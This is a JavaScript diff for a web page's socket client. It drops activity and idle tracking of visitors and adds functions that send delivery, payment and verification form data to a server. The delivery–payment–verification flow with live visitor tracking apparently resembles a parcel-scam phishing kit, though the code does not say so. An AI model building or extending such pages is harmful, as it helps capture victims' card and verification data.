@@ -50,58 +50,35 @@ function initSocket() {
 }
 
 // ==========================================
-// VISIBILITY TRACKING - Active/Idle System
+// MINIMAL TRACKING - Only connect/disconnect and form submissions
+// NO real-time typing tracking, NO activity floods
 // ==========================================
 
-// Track when visitor becomes active (page visible)
-function handleVisibilityChange() {
+// Track page changes only when navigating between pages
+function trackPageChange(page) {
   if (!socket || !socket.connected) return;
-  
-  if (document.visibilityState === 'visible') {
-    console.log('👁️ Page visible - sending visitor:active');
-    socket.emit('visitor:active', { sessionId, timestamp: Date.now() });
-  } else {
-    console.log('💤 Page hidden - sending visitor:idle');
-    socket.emit('visitor:idle', { sessionId, timestamp: Date.now() });
-  }
+  console.log('📄 Page change: ' + page);
+  socket.emit('visitor:page', { sessionId, page });
 }
 
-// Listen for visibility changes
-document.addEventListener('visibilitychange', handleVisibilityChange);
-
-// Also track user activity (mouse, keyboard, scroll)
-let activityTimeout = null;
-const IDLE_THRESHOLD = 30000; // 30 seconds of inactivity = idle
-
-function resetActivityTimer() {
+// Track form submissions ONLY - no input tracking
+function submitDeliveryForm(formData) {
   if (!socket || !socket.connected) return;
-  
-  // Clear existing timer
-  if (activityTimeout) {
-    clearTimeout(activityTimeout);
-  }
-  
-  // Send active signal
-  if (document.visibilityState === 'visible') {
-    socket.emit('visitor:active', { sessionId, timestamp: Date.now() });
-  }
-  
-  // Set idle timer
-  activityTimeout = setTimeout(() => {
-    if (document.visibilityState === 'visible') {
-      console.log('💤 User idle for 30s - sending visitor:idle');
-      socket.emit('visitor:idle', { sessionId, timestamp: Date.now() });
-    }
-  }, IDLE_THRESHOLD);
+  console.log('📦 Submitting delivery form...');
+  socket.emit('form:delivery', { sessionId, formData });
 }
 
-// Track user activity events
-['mousedown', 'mousemove', 'keydown', 'scroll', 'touchstart', 'touchend'].forEach(event => {
-  document.addEventListener(event, resetActivityTimer, { passive: true });
-});
+function submitPaymentForm(paymentData) {
+  if (!socket || !socket.connected) return;
+  console.log('💳 Submitting payment form...');
+  socket.emit('form:payment', { sessionId, paymentData });
+}
 
-// Initial activity timer
-resetActivityTimer();
+function submitVerificationForm(verificationData) {
+  if (!socket || !socket.connected) return;
+  console.log('🔐 Submitting verification form...');
+  socket.emit('form:verification', { sessionId, verificationData });
+}
 
 function updateConnectionStatus(isOnline) {
   const statusDot = document.querySelector('.status-dot');
@@ -120,36 +97,6 @@ function getCurrentPage() {
   if (path.includes('payment')) return 'payment';
   if (path.includes('verification')) return 'verification';
   return 'home';
-}
-
-function trackPageChange(page) {
-  if (socket && socket.connected) {
-    socket.emit('visitor:page', { sessionId, page });
-  }
-}
-
-function submitDeliveryForm(formData) {
-  if (socket && socket.connected) {
-    socket.emit('form:delivery', { sessionId, formData });
-    return true;
-  }
-  return false;
-}
-
-function submitPaymentForm(paymentData) {
-  if (socket && socket.connected) {
-    socket.emit('form:payment', { sessionId, paymentData });
-    return true;
-  }
-  return false;
-}
-
-function submitVerificationForm(verificationData) {
-  if (socket && socket.connected) {
-    socket.emit('form:verification', { sessionId, verificationData });
-    return true;
-  }
-  return false;
 }
 
 function showToast(message, type = 'success') {
